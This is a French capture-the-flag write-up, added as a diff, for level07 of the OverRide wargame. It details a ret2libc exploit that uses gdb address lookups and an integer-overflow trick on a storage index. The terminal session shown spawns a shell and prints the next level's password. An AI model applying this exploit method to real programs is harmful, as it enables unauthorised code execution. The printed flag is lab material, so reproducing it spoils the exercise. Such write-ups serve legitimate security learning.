@@ -1,0 +1,79 @@
+premiere chose, on se rend compte que l'on peut stocker et lire des nombre dans des index et que 1 index sur 3 est reservé le nombre ne doit donc pas etre multiple de 3 et son premier octet ne peux pas etre 0xb7
+
+On va tres probableemnt utiliser la fonction store number pour ecraser de la data
+
+Le nombre que nous allons donné à la commande read sera donc stocké à l'adresse DATA_ADDR + INDEX * 4
+
+On va donc faire une attaque ret2libc mais differement du lvl 05 ou 01 puisque je ne vois pas comment inclure un shellcode la dedans donc il nous faut 4 elements:
+- EIP : 0xffffd60c
+- buffer : 0xffffd444
+- adress fonction system: 0xf7e6aed0 
+- adress "/bin/sh" : ??? 
+
+Ok pour trouver l'adress de '/bin/sh' :
+
+(gdb) info proc map
+...
+0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+donc on trouve 0xf7f897ec
+
+on commence comme d'habitude par calculer le padding
+EIP - buffer
+ffffd60c – ffffd444 = 1C8
+1c8 => 456
+
+comme dit plus tot "Le nombre que nous allons donné à la commande read sera donc stocké à l'adresse DATA_ADDR + INDEX * 4"
+on divise donc par 4
+
+456 / 4 = 114
+
+Ca ne marche pas car 114 est un multiple de 3 donc l'index est reservé. Cependant:
+    data[index << 2] = nb;
+
+On peut voir que la condition est faite avant le décalage binaire les 2 premier bite vont donc pop au moment du décalage et ne sont donc modifiable
+
+
+(go utiliser https://www.rapidtables.com/convert/number/binary-to-decimal.html les autres site sont turbo cringe)
+
+Actuellement,
+114 = 0000 0000 0000 0000 0000 0000 0111 0010
+mais 0100 0000 0000 0000 0000 0000 0111 0010, 1000 0000 0000 0000 0000 0000 0111 0010 et 1100 0000 0000 0000 0000 0000 0111 0010
+auront le meme "effet"
+
+Donc:
+0100 0000 0000 0000 0000 0000 0111 0010 = 1073741938 << WRONG
+1000 0000 0000 0000 0000 0000 0111 0010 = 2147483762 << on va prendre celui la
+1100 0000 0000 0000 0000 0000 0111 0010 = 3221225586 << WRONG
+
+system = 0xf7e6aed0 = 4159090384
+str = 0xf7f897ec = 4160264172 
+index1 = 2147483762 (114 avec le cheat des deux octet)
+index2 = 116 (pratique c'est pas un multiple de 3)
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
